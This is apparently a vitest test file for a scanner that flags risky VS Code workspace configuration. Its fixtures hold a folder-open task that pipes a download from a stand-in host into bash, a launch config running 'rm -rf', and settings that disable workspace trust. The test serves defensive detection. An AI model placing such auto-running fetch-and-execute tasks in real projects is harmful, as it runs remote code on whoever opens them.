import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import {
  formatWorkspaceConfigScanResult,
  scanWorkspaceConfig
} from "../src";
import { cleanupWorkspaceSandboxes, createWorkspaceSandbox } from "./helpers/workspaceSandbox";

async function writeRepoFile(rootPath: string, relativePath: string, content: string): Promise<void> {
  const targetPath = path.join(rootPath, relativePath);
  await mkdir(path.dirname(targetPath), { recursive: true });
  await writeFile(targetPath, content, "utf8");
}

afterEach(async () => {
  await cleanupWorkspaceSandboxes();
});

describe("scanWorkspaceConfig", () => {
  it("accepts JSONC comments and trailing commas for safe files", async () => {
    const rootPath = await createWorkspaceSandbox("workspace-guard-config");
    await writeRepoFile(rootPath, ".vscode/settings.json", `{
  // keep trust enabled
  "security.workspace.trust.enabled": true,
  "task.allowAutomaticTasks": "off",
}
`);

    const result = await scanWorkspaceConfig(rootPath);

    expect(result.scannedFiles).toEqual([".vscode/settings.json"]);
    expect(result.findings).toEqual([]);
    expect(formatWorkspaceConfigScanResult(result)).toContain("No configuration findings");
  });

  it("detects risky tasks, launch, MCP, settings, and workspace recommendations", async () => {
    const rootPath = await createWorkspaceSandbox("workspace-guard-config");
    await writeRepoFile(rootPath, ".vscode/tasks.json", `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "bootstrap",
      "type": "shell",
      "runOn": "folderOpen",
      "command": "curl https://example.invalid/install.sh | bash"
    }
  ]
}
`);
    await writeRepoFile(rootPath, ".vscode/launch.json", `{
  "configurations": [
    {
      "name": "Launch App",
      "type": "node",
      "request": "launch",
      "preLaunchTask": "bootstrap",
      "runtimeExecutable": "bash",
      "args": ["-c", "rm -rf ./tmp"]
    }
  ]
}
`);
    await writeRepoFile(rootPath, ".vscode/mcp.json", `{
  "servers": {
    "demo": {
      "command": "npx",
      "args": ["demo-mcp-server@latest"]
    }
  }
}
`);
    await writeRepoFile(rootPath, ".vscode/settings.json", `{
  "task.allowAutomaticTasks": "on",
  "security.workspace.trust.enabled": false
}
`);
    await writeRepoFile(rootPath, "demo.code-workspace", `{
  "folders": [{ "path": "." }],
  "extensions": {
    "recommendations": ["github.copilot"]
  }
}
`);

    const result = await scanWorkspaceConfig(rootPath, { profile: "restricted" });
    const findingIds = result.findings.map((finding) => finding.id);

    expect(result.scannedFiles).toEqual([
      ".vscode/launch.json",
      ".vscode/mcp.json",
      ".vscode/settings.json",
      ".vscode/tasks.json",
      "demo.code-workspace"
    ]);
    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-CFGTASK-001",
      "WG-CFGTASK-002",
      "WG-CFGLAUNCH-001",
      "WG-CFGLAUNCH-002",
      "WG-CFGMCP-002",
      "WG-CFGSET-001",
      "WG-CFGSET-002",
      "WG-CFGWS-001"
    ]));
  });

  it("reports broken JSONC inputs as findings", async () => {
    const rootPath = await createWorkspaceSandbox("workspace-guard-config");
    await writeRepoFile(rootPath, ".vscode/tasks.json", `{
  "tasks": [
    { "label": "broken", "command": "echo hi" }
`);

    const result = await scanWorkspaceConfig(rootPath);

    expect(result.findings).toEqual([
      expect.objectContaining({
        id: "WG-CFGJSON-001",
        file: ".vscode/tasks.json",
        severity: "medium"
      })
    ]);
  });
});